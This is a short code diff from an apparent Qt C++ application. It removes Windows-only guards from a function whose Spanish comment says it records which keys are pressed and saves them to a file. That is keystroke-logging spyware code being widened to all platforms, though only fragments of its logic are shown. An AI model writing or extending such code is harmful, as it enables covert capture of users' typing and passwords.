@@ -638,7 +638,6 @@ void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
 }
 void MainWindow::escucharTeclas()
 {
-    #ifdef Q_WS_WIN
     /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
 
         log.open(QFile::Append);
@@ -652,7 +651,6 @@ void MainWindow::escucharTeclas()
             cadenaa.clear();
             log.close();
         }
-        #endif
 }
 
 paralelo::paralelo()
